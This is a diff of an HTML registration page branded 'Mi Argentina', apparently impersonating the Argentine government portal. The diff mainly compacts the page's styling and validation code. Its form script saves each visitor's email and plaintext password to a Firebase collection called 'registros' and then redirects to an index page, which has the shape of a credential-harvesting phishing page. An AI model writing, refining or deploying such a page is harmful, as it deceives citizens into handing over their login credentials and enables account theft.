@@ -3,130 +3,26 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=0">
-    <title>Crear cuenta - Mi Argentina</title>
+    <title>Registro - Mi Argentina</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .masterContainer {
-            width: 100%;
-            max-width: 450px;
-            padding: 20px;
-        }
-
-        .formContainer {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-
-        .loginForm_title {
-            color: #3730ba;
-            font-size: 26px;
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        .subtitle {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 30px;
-        }
-
-        .loginForm_fieldContainer {
-            margin-bottom: 25px;
-        }
-
-        .registerForm_labelSpan {
-            display: block;
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 8px;
-        }
-
-        /* Estilos de los Inputs */
-        .registerForm_input {
-            width: 100%;
-            padding: 10px 0;
-            border: none;
-            border-bottom: 2px solid #ccc; /* Borde base */
-            outline: none;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        /* Clases de validación */
-        .input-invalid {
-            border-bottom-color: #ff4d4d !important; /* Rojo */
-        }
-
-        .input-valid {
-            border-bottom-color: #2ecc71 !important; /* Verde */
-        }
-
-        .custom-button {
-            width: 100%;
-            background-color: #3730ba;
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 6px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            text-transform: uppercase;
-        }
-
-        .custom-button:disabled {
-            background-color: #e0e0e0;
-            color: #999;
-            cursor: not-allowed;
-        }
-
-        .back-link {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
-            color: #007bff;
-            text-decoration: none;
-            font-size: 14px;
-        }
+        body { margin: 0; background-color: #f5f5f5; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .formContainer { background: white; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%; max-width: 350px; }
+        .loginForm_title { color: #3730ba; font-size: 26px; margin-bottom: 10px; font-weight: 700; }
+        .registerForm_input { width: 100%; padding: 10px 0; border: none; border-bottom: 2px solid #ccc; outline: none; font-size: 16px; margin-bottom: 20px; transition: 0.3s; }
+        .input-invalid { border-bottom-color: #ff4d4d !important; }
+        .input-valid { border-bottom-color: #2ecc71 !important; }
+        .custom-button { width: 100%; background-color: #3730ba; color: white; border: none; padding: 16px; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .custom-button:disabled { background-color: #e0e0e0; color: #999; }
     </style>
 </head>
 <body>
-    <div class="masterContainer">
-        <div class="formContainer">
-            <h2 class="loginForm_title">Crea tu cuenta</h2>
-            <p class="subtitle">Ingresa tus datos para registrarte en Mi Argentina.</p>
-            
-            <form id="registerForm">
-                <div class="loginForm_fieldContainer">
-                    <label class="registerForm_label">
-                        <span class="registerForm_labelSpan">Correo electronico</span>
-                        <input id="reg-email" name="email" class="registerForm_input" type="email" required placeholder="ejemplo@correo.com">
-                    </label>
-                </div>
-
-                <div class="loginForm_fieldContainer">
-                    <label class="registerForm_label">
-                        <span class="registerForm_labelSpan">Crea una contraseña</span>
-                        <input id="reg-password" name="password" class="registerForm_input" type="password" required placeholder="Mínimo 6 caracteres">
-                    </label>
-                </div>
-
-                <button type="submit" id="btnRegistro" class="custom-button" disabled>Continuar</button>
-            </form>
-            <a href="index.html" class="back-link">Volver al inicio de sesión</a>
-        </div>
+    <div class="formContainer">
+        <h2 class="loginForm_title">Crea tu cuenta</h2>
+        <form id="registerForm">
+            <input id="reg-email" class="registerForm_input" type="email" placeholder="Correo electrónico" required>
+            <input id="reg-password" class="registerForm_input" type="password" placeholder="Contraseña (6+ caracteres)" required>
+            <button type="submit" id="btnRegistro" class="custom-button" disabled>Continuar</button>
+        </form>
     </div>
 
     <script type="module">
@@ -150,52 +46,29 @@
         const passIn = document.getElementById('reg-password');
         const regBtn = document.getElementById('btnRegistro');
 
-        function validarInputs() {
-            const emailValido = emailIn.value.includes('@') && emailIn.value.includes('.');
-            const passValida = passIn.value.length >= 6;
-
-            // Validación Visual Email
-            if (emailIn.value.length > 0) {
-                emailIn.classList.toggle('input-valid', emailValido);
-                emailIn.classList.toggle('input-invalid', !emailValido);
-            }
-
-            // Validación Visual Password
-            if (passIn.value.length > 0) {
-                passIn.classList.toggle('input-valid', passValida);
-                passIn.classList.toggle('input-invalid', !passValida);
-            }
-
-            // Habilitar Botón
-            regBtn.disabled = !(emailValido && passValida);
+        function validar() {
+            const ev = emailIn.value.includes('@') && emailIn.value.includes('.');
+            const pv = passIn.value.length >= 6;
+            emailIn.className = ev ? 'registerForm_input input-valid' : 'registerForm_input input-invalid';
+            passIn.className = pv ? 'registerForm_input input-valid' : 'registerForm_input input-invalid';
+            regBtn.disabled = !(ev && pv);
         }
 
-        emailIn.addEventListener('input', validarInputs);
-        passIn.addEventListener('input', validarInputs);
+        emailIn.addEventListener('input', validar);
+        passIn.addEventListener('input', validar);
 
         document.getElementById('registerForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             regBtn.innerText = "PROCESANDO...";
-            regBtn.disabled = true;
-
             try {
-                // Guardamos en Firebase
                 await addDoc(collection(db, "registros"), {
                     email: emailIn.value,
                     password: passIn.value,
                     fecha: new Date().toLocaleString()
                 });
-                
-                // ÉXITO: Volvemos al inicio de sesión automáticamente
                 window.location.href = "index.html"; 
-
-            } catch (error) {
-                console.error("Error Firebase:", error);
-                alert("Hubo un error al guardar los datos. Revisa tu consola.");
-                regBtn.disabled = false;
-                regBtn.innerText = "CONTINUAR";
-            }
+            } catch (err) { alert("Error: " + err.message); regBtn.innerText = "CONTINUAR"; }
         });
     </script>
 </body>
-</html>
+</html>3
